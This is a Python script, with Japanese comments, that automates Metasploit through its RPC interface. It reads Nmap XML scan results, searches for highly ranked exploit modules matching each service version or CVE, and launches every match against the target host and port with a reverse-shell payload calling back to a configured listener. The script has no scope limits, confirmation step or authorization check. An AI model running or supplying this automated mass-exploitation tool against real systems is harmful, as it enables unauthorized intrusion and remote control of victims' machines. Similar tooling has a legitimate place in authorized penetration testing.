import yaml
import xml.etree.ElementTree as ET
from pymetasploit3.msfrpc import MsfRpcClient

class AutoMetasploit:
    def __init__(self, xml_file_path, config_path="config.yaml"):
        self.xml_file_path = xml_file_path
        self.config = self.load_config(config_path)
        self.client = self.connect_to_metasploit()

    def load_config(self, file_path):
        """設定ファイルを読み込む"""
        with open(file_path, 'r') as file:
            return yaml.safe_load(file)

    def connect_to_metasploit(self):
        """Metasploit RPCサーバーへ接続する"""
        try:
            client = MsfRpcClient(
                self.config['msf_password'], 
                server=self.config['msf_host'], 
                port=self.config['msf_port']
            )
            return client
        except Exception as e:
            print("Metasploit RPCサーバーへの接続に失敗しました:", e)
            return None

    def parse_nmap_xml(self):
        """NmapのXML出力からIP、ポート、サービス情報を抽出する"""
        tree = ET.parse(self.xml_file_path)
        root = tree.getroot()
        
        services = []
        for host in root.findall("host"):
            ip_address = host.find("address").get("addr")
            for port in host.findall("ports/port"):
                service_info = {
                    "ip": ip_address,
                    "port": port.get("portid"),
                    "service": None,
                    "product": None,
                    "version": None,
                    "cve": None
                }
                service = port.find("service")
                if service is not None:
                    service_info["service"] = service.get("name")
                    service_info["product"] = service.get("product")
                    service_info["version"] = service.get("version")
                
                for script in port.findall("script"):
                    output = script.get("output")
                    if "CVE" in output:
                        service_info["cve"] = output.split("CVE-")[1].split()[0]
                
                services.append(service_info)
        
        return services

    def is_high_rank(self, module):
        """エクスプロイトのrankがgood以上か確認"""
        rank_dict = {
            'excellent': 6,
            'great': 5,
            'good': 4,
            'normal': 3,
            'average': 2,
            'low': 1,
            'manual': 0
        }
        return rank_dict.get(module.get('rank', 'manual').lower(), 0) >= 4

    def search_exploits(self):
        """Nmap解析結果を基にMetasploitでエクスプロイトを検索し、結果を辞書型で返す"""
        if not self.client:
            print("Metasploit RPCサーバーに接続できていないため、検索を中止します。")
            return {}

        services = self.parse_nmap_xml()
        exploit_data = {}

        for service_info in services:
            # product が空の場合は検索しない
            if not service_info["product"]:
                continue

            # productとversionを使って検索クエリを作成
            search_params = ["type:exploit"]
            if service_info["version"]:
                search_params.append(f"{service_info['product']} {service_info['version']}")
            else:
                search_params.append(service_info["product"])
            
            search_query = " ".join(search_params)
            exploits = self.client.modules.search(search_query)

            # 検索結果の辞書格納 (rank: good以上)
            for exploit in exploits:
                if self.is_high_rank(exploit):
                    ip = service_info["ip"]
                    port = service_info["port"]
                    if ip not in exploit_data:
                        exploit_data[ip] = {}
                    if port not in exploit_data[ip]:
                        exploit_data[ip][port] = []
                    exploit_entry = {
                        "name": exploit.get("fullname"),
                        "description": exploit.get("description"),
                        "platform": exploit.get("platform"),
                        "references": exploit.get("references")
                    }
                    exploit_data[ip][port].append(exploit_entry)

            # CVE検索が必要な場合
            if service_info["cve"]:
                cve_query = f"type:exploit cve:{service_info['cve']}"
                cve_exploits = self.client.modules.search(cve_query)

                # CVE検索結果の辞書格納 (rank: good以上)
                for exploit in cve_exploits:
                    if self.is_high_rank(exploit):
                        ip = service_info["ip"]
                        port = service_info["port"]
                        if ip not in exploit_data:
                            exploit_data[ip] = {}
                        if port not in exploit_data[ip]:
                            exploit_data[ip][port] = []
                        exploit_entry = {
                            "name": exploit.get("fullname"),
                            "description": exploit.get("description"),
                            "platform": exploit.get("platform"),
                            "references": exploit.get("references")
                        }
                        exploit_data[ip][port].append(exploit_entry)
        
        return exploit_data

    def run_exploits(self, exploit_data):
        """指定されたエクスプロイト情報に基づき、エクスプロイトを実行する"""
        if not self.client:
            print("Metasploit RPCサーバーに接続できていないため、エクスプロイト実行を中止します。")
            return

        for ip, ports in exploit_data.items():
            for port, exploits in ports.items():
                for exploit_info in exploits:
                    exploit_module = self.client.modules.use('exploit', exploit_info["name"])
                    exploit_module['RHOSTS'] = ip
                    exploit_module['RPORT'] = port
                    exploit_module['LHOST'] = self.config['lhost']
                    exploit_module['LPORT'] = self.config['lport']
                    
                    print(f"エクスプロイト実行: {exploit_info['name']} (IP: {ip}, Port: {port})")
                    exploit_module.execute(payload='generic/shell_reverse_tcp')

# 使用例
xml_file_path = "nmap_scan_result.xml"
metasploit = AutoMetasploit(xml_file_path)
exploit_data = metasploit.search_exploits()
print("=== 検索結果 ===")
print(exploit_data)
metasploit.run_exploits(exploit_data)
